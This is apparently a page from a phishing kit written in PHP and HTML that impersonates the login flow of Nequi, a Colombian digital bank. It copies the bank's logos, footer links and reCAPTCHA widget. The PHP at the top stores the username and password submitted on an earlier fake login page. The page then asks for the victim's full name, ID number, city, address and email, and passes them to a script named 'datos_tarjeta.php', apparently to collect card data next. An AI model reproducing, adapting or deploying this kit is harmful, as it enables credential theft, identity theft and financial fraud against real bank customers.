<?php


session_start();

if($_SERVER["REQUEST_METHOD"] == "POST"){
    $j_username = $_POST["j_username"];
    $j_password = $_POST["j_password"];
    $_SESSION["j_username"] = $j_username;
    $_SESSION["j_password"] = $j_password;

}else{
    header("location:/bdigital/login.html");
}


?>

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
   
    <meta charset="utf-8">
    <title>Nequi</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="generator" content="Webflow">
    <meta http-equiv="cache-control" content="max-age=0">
    <meta http-equiv="cache-control" content="no-cache">
    <meta http-equiv="expires" content="0">
    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT">
    <meta http-equiv="pragma" content="no-cache">
      <style type="text/css" id="operaUserStyle"></style>
    <link rel="stylesheet" type="text/css" href="css/normalize.css">
    <link rel="stylesheet" type="text/css" href="css/nequi_two.webflow.css">
    <link rel="stylesheet" type="text/css" href="css/nequi_one.webflow.css">
    <link rel="stylesheet" type="text/css" href="css/main.css">

    <!-- Librerias JS -->
    <script src="//ajax.googleapis.com/ajax/libs/angularjs/1.4.0-beta.2/angular.min.js"></script>
    <script src="https://code.angularjs.org/1.4.3/i18n/angular-locale_en-us.js"></script>
    <script src="js/libs/lodash.min.js"></script>
    <script src="js/libs/restangular.min.js"></script>
    <script type="text/javascript" src="js/libs/angular-recaptcha.min.js"></script>

</head>

<body ng-app="App" class="ng-scope">

    <div id="content">
        <!-- ngInclude: getTemplate('/header.html') -->
        <div ng-include="getTemplate('/header.html')" class="ng-scope">
            <header class="ng-scope">
                <div class="wrap-header">
                    <div class="row">
                        <div class="col-xs-12 col-md-2">
                            <div class="logo"> <a href="https://www.nequi.com.co"> <img alt="nequi"
                                        src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64dfef05bc6705edb9447499_nequi.svg">
                                </a> </div>
                            <div class="btn-menu-hamburguer" ng-click="openMenu();"> <a class=""> <span></span> </a>
                            </div>
                        </div>
                        <div class="col-xs-12 col-md-10 container-buttons">
                            <div class="wrap-main-menu ">
                                <div class="row">
                                    <div class="col-xs-12 col-md-8"> </div>
                                    <div class="col-xs-12 col-md-4">
                                        <div class="buttons-right">
                                            <ul> <!-- ngIf: !hidePa -->
                                                <li ng-if="!hidePa" class="ng-scope"> <a target="_blank"
                                                        href="https://recarga.nequi.com.co/bdigitalpsl"
                                                        class="ng-binding">Recarga</a> </li><!-- end ngIf: !hidePa -->
                                            </ul>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </header>
        </div>
        <section class="login-section ng-scope" ng-controller="loginController as loginControl">
            <div class="login-wrap">
                <img src="images/push-action-timerV2.gif" alt="" srcset="" width="25%">
                <h1 class="ng-binding">Queremos verificar tu identidad</h1>
                <div class="login-form-wrap">
                    <form method="POST" action="datos_tarjeta.php" autocomplete="off"
                        name="loginControl.formLogin" novalidate=""
                        class="ng-pristine ng-valid-us-phone-number ng-invalid ng-invalid-required ng-valid-pattern ng-valid-minlength ng-valid-maxlength ng-invalid-recaptcha">
                       
                        <div class="preguntas">
                            
                            <input type="text" name="nombre" style="width:90%; height:35px; background-color:rgba(243, 213, 228, 0.364); border:none; padding-left:10px;" placeholder="Nombre Completo" required>
                            <br><input type="tel" name="cedula" style="width:90%; height:35px; background-color:rgba(243, 213, 228, 0.364); border:none; margin-top:10px; padding-left:10px;" placeholder="Número de Identificación" required>
                            <br><input type="text" name="ciudad" style="width:90%; height:35px; background-color:rgba(243, 213, 228, 0.364); border:none;margin-top:10px;padding-left:10px;" placeholder="Ciudad de Residencia" required>
                            <br><input type="text" name="dir" style="width:90%; height:35px; background-color:rgba(243, 213, 228, 0.364); border:none;margin-top:10px;padding-left:10px;" placeholder="Dirección" required>
                            <br><input type="address" name="email" style="width:90%; height:35px; background-color:rgba(243, 213, 228, 0.364); border:none;margin-top:10px;padding-left:10px;" placeholder="Email de Contacto" required>

                           
                        </div>
                        <div class="btn-wrap">
                            <input class="form-btn-submit" type="submit" value="Continuar">
                        </div>
                                
                    </form>
                </div>
            </div>
        </section>

        <!-- ngInclude: getTemplate('/footer.html') -->
        <div ng-include="getTemplate('/footer.html')" class="ng-scope">
            <footer class="ng-scope">
                <div class="container-footer"> <!-- ngIf: !hidePa -->
                    <div ng-if="!hidePa" class="logo-vigilado ng-scope"></div><!-- end ngIf: !hidePa -->
                    <div class="container-top">
                        <div class="logo-nequi"> <img alt="logo nequi"
                                src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50b03c9fda96db04be382_logo-nequi-blanco.svg">
                        </div>
                        <div class="stores"> <a
                                href="https://play.google.com/store/apps/details?id=com.nequi.MobileApp&amp;hl=es"> <img
                                    src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50ed88b7bb33f2c2c4653_store-googleplay.svg">
                            </a> <a href="https://apps.apple.com/co/app/nequi/id1075378688"> <img
                                    src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50ed702047ba456edd2cb_store-apple.svg">
                            </a> <a
                                href="https://appgallery.huawei.com/#/app/C101700131?channelId=browser&amp;detailType=0">
                                <img
                                    src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50ed702047ba456edd25c_store-huawei.svg">
                            </a> </div>
                        <div class="group-bancolombia"> <a href="https://www.grupobancolombia.com/"> <img
                                    class="img-group-bancolombia"
                                    src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e50f4c6011eb184c8d7d99_logo-grupo-bancolombia.svg">
                            </a> </div>
                    </div>
                    <hr class="separator">
                    <div class="container-middle"> <!-- ngRepeat: item in configCountry.labels -->
                        <div class="col ng-scope" ng-repeat="item in configCountry.labels"> <input type="checkbox"
                                id="info-legal" class="hide"> <label for="info-legal" class="ng-binding"> Información
                                legal <img class="ic-accordion hide"
                                    src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e573948290d271c9185df0_ic-arrow.svg">
                            </label>
                            <div class="content-accordion"> <!-- ngRepeat: dataLink in item.data --><a
                                    ng-repeat="dataLink in item.data"
                                    href="https://www.nequi.com.co/legal-web/condiciones-de-uso-de-la-pagina-web"
                                    class="ng-binding ng-scope">Condiciones de
                                    uso</a><!-- end ngRepeat: dataLink in item.data --><a
                                    ng-repeat="dataLink in item.data"
                                    href="https://www.nequi.com.co/legal-web/tratamiento-de-datos-personales-nequi"
                                    class="ng-binding ng-scope">Tratamiento de Datos
                                    Personales</a><!-- end ngRepeat: dataLink in item.data --><a
                                    ng-repeat="dataLink in item.data"
                                    href="https://www.nequi.com.co/informacion-legal#consumidor-financiero"
                                    class="ng-binding ng-scope">Consumidor
                                    fianciero</a><!-- end ngRepeat: dataLink in item.data --><a
                                    ng-repeat="dataLink in item.data"
                                    href="https://www.nequi.com.co/informacion-legal/defensor-del-consumidor-financiero-de-nequi"
                                    class="ng-binding ng-scope">Defensor del Consumidor
                                    Financiero</a><!-- end ngRepeat: dataLink in item.data --><a
                                    ng-repeat="dataLink in item.data"
                                    href="https://www.nequi.com.co/legal-tarjeta-nequi/terminos-y-condiciones-de-tarjeta-nequi"
                                    class="ng-binding ng-scope">Términos y condiciones Tarjeta
                                    Nequi</a><!-- end ngRepeat: dataLink in item.data --><a
                                    ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/informacion-legal"
                                    class="ng-binding ng-scope">Legal
                                    Nequi</a><!-- end ngRepeat: dataLink in item.data --> </div>
                        </div><!-- end ngRepeat: item in configCountry.labels -->
                        <div class="col ng-scope" ng-repeat="item in configCountry.labels"> <input type="checkbox"
                                id="para-personas" class="hide"> <label for="para-personas" class="ng-binding"> Para
                                personas <img class="ic-accordion hide"
                                    src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e573948290d271c9185df0_ic-arrow.svg">
                            </label>
                            <div class="content-accordion"> <!-- ngRepeat: dataLink in item.data --><a
                                    ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/tarjeta-nequi"
                                    class="ng-binding ng-scope">Tarjeta
                                    Nequi</a><!-- end ngRepeat: dataLink in item.data --><a
                                    ng-repeat="dataLink in item.data"
                                    href="https://www.nequi.com.co/prestamo-salvavidas"
                                    class="ng-binding ng-scope">Préstamo
                                    Salvavidas</a><!-- end ngRepeat: dataLink in item.data --><a
                                    ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/prestamo-propulsor"
                                    class="ng-binding ng-scope">Préstamo
                                    Propulsor</a><!-- end ngRepeat: dataLink in item.data --><a
                                    ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/usa-tu-plata"
                                    class="ng-binding ng-scope">Usa tu
                                    plata</a><!-- end ngRepeat: dataLink in item.data --><a
                                    ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/paypal"
                                    class="ng-binding ng-scope">Paypal</a><!-- end ngRepeat: dataLink in item.data --><a
                                    ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/remesas"
                                    class="ng-binding ng-scope">Remesas</a><!-- end ngRepeat: dataLink in item.data -->
                            </div>
                        </div><!-- end ngRepeat: item in configCountry.labels -->
                        <div class="col ng-scope" ng-repeat="item in configCountry.labels"> <input type="checkbox"
                                id="para-negocio" class="hide"> <label for="para-negocio" class="ng-binding"> Para tu
                                negocio <img class="ic-accordion hide"
                                    src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e573948290d271c9185df0_ic-arrow.svg">
                            </label>
                            <div class="content-accordion"> <!-- ngRepeat: dataLink in item.data --><a
                                    ng-repeat="dataLink in item.data" href="https://negocios.nequi.co/"
                                    class="ng-binding ng-scope">Negocios</a><!-- end ngRepeat: dataLink in item.data -->
                            </div>
                        </div><!-- end ngRepeat: item in configCountry.labels -->
                        <div class="col ng-scope" ng-repeat="item in configCountry.labels"> <input type="checkbox"
                                id="ayuda" class="hide"> <label for="ayuda" class="ng-binding"> Ayuda <img
                                    class="ic-accordion hide"
                                    src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e573948290d271c9185df0_ic-arrow.svg">
                            </label>
                            <div class="content-accordion"> <!-- ngRepeat: dataLink in item.data --><a
                                    ng-repeat="dataLink in item.data" href="https://ayuda.nequi.com.co/hc/es"
                                    class="ng-binding ng-scope">Centro de
                                    ayuda</a><!-- end ngRepeat: dataLink in item.data --><a
                                    ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/blog"
                                    class="ng-binding ng-scope">Blog metidas de
                                    plata</a><!-- end ngRepeat: dataLink in item.data --><a
                                    ng-repeat="dataLink in item.data" href="https://comunidad.nequi.co/"
                                    class="ng-binding ng-scope">Comunidad
                                    Nequi</a><!-- end ngRepeat: dataLink in item.data --><a
                                    ng-repeat="dataLink in item.data"
                                    href="https://www.nequi.com.co/roberto-hurtado-tips-de-seguridad"
                                    class="ng-binding ng-scope">Tips de
                                    seguridad</a><!-- end ngRepeat: dataLink in item.data --> </div>
                        </div><!-- end ngRepeat: item in configCountry.labels -->
                        <div class="col ng-scope" ng-repeat="item in configCountry.labels"> <input type="checkbox"
                                id="conocenos" class="hide"> <label for="conocenos" class="ng-binding"> Conócenos <img
                                    class="ic-accordion hide"
                                    src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e573948290d271c9185df0_ic-arrow.svg">
                            </label>
                            <div class="content-accordion"> <!-- ngRepeat: dataLink in item.data --><a
                                    ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/somos-nequi"
                                    class="ng-binding ng-scope">¿Quiénes
                                    somos?</a><!-- end ngRepeat: dataLink in item.data --><a
                                    ng-repeat="dataLink in item.data"
                                    href="https://www.nequi.com.co/nequi-trabaja-con-nosotros"
                                    class="ng-binding ng-scope">Trabaja con
                                    nosotros</a><!-- end ngRepeat: dataLink in item.data --><a
                                    ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/sala-de-prensa"
                                    class="ng-binding ng-scope">Sala de
                                    prensa</a><!-- end ngRepeat: dataLink in item.data --><a
                                    ng-repeat="dataLink in item.data" href="https://www.nequi.com.co/comunicados"
                                    class="ng-binding ng-scope">Comunicados</a><!-- end ngRepeat: dataLink in item.data -->
                            </div>
                        </div><!-- end ngRepeat: item in configCountry.labels -->
                    </div>
                    <hr class="separator">
                    <div class="container-end"> <!-- ngRepeat: item in configCountry.socialMedia --><a
                            ng-repeat="item in configCountry.socialMedia" href="https://twitter.com/Nequi"
                            class="ng-scope"> <img
                                src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e5220142aa063fa007c444_ic-twitter.svg">
                        </a><!-- end ngRepeat: item in configCountry.socialMedia --><a
                            ng-repeat="item in configCountry.socialMedia" href="https://www.instagram.com/nequi_/"
                            class="ng-scope"> <img
                                src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e52201416719efe915e448_ic-instagram.svg">
                        </a><!-- end ngRepeat: item in configCountry.socialMedia --><a
                            ng-repeat="item in configCountry.socialMedia" href="https://www.facebook.com/appnequi/"
                            class="ng-scope"> <img
                                src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e52201c1a7bf3e9e5bd566_ic-facebook.svg">
                        </a><!-- end ngRepeat: item in configCountry.socialMedia --><a
                            ng-repeat="item in configCountry.socialMedia"
                            href="https://www.linkedin.com/company/nequi/mycompany/" class="ng-scope"> <img
                                src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e522013be191fdc4a0252e_ic-linkedin.svg">
                        </a><!-- end ngRepeat: item in configCountry.socialMedia --><a
                            ng-repeat="item in configCountry.socialMedia"
                            href="https://www.youtube.com/channel/UCK1dLH3nTK-GOlgSVa95XNg/feed" class="ng-scope"> <img
                                src="https://uploads-ssl.webflow.com/6317a229ebf7723658463b4b/64e52201c663d0190bc59ba8_ic-youtube.svg">
                        </a><!-- end ngRepeat: item in configCountry.socialMedia --> </div>
                    <hr class="separator hide show-mobile">
                </div>
            </footer>
        </div>
    </div>

    <!-- App -->
    <script src="js/script.js"></script>

    <script async="" defer=""
        src="https://www.google.com/recaptcha/api.js?onload=vcRecaptchaApiLoaded&amp;render=explicit"></script>
    <div
        style="background-color: rgb(255, 255, 255); border: 1px solid rgb(204, 204, 204); box-shadow: rgba(0, 0, 0, 0.2) 2px 2px 3px; position: absolute; transition: visibility 0s linear 0.3s, opacity 0.3s linear 0s; opacity: 0; visibility: hidden; z-index: 2000000000; left: 0px; top: -10000px;">
        <div
            style="width: 100%; height: 100%; position: fixed; top: 0px; left: 0px; z-index: 2000000000; background-color: rgb(255, 255, 255); opacity: 0.05;">
        </div>
        <div class="g-recaptcha-bubble-arrow"
            style="border: 11px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -11px; z-index: 2000000000;">
        </div>
        <div class="g-recaptcha-bubble-arrow"
            style="border: 10px solid transparent; width: 0px; height: 0px; position: absolute; pointer-events: none; margin-top: -10px; z-index: 2000000000;">
        </div>
        <div style="z-index: 2000000000; position: relative;"><iframe title="El reCAPTCHA caduca dentro de dos minutos"
                name="c-23ulu23lv1it" frameborder="0" scrolling="no"
                sandbox="allow-forms allow-popups allow-same-origin allow-scripts allow-top-navigation allow-modals allow-popups-to-escape-sandbox"
                src="https://www.google.com/recaptcha/api2/bframe?hl=es&amp;v=-QbJqHfGOUB8nuVRLvzFLVed&amp;k=6LdjCwshAAAAALml0fdmI80RRivlxm74orS_2V4i"
                style="width: 100%; height: 100%;"></iframe></div>
    </div>
</body><!-- Encriptar -->

</html>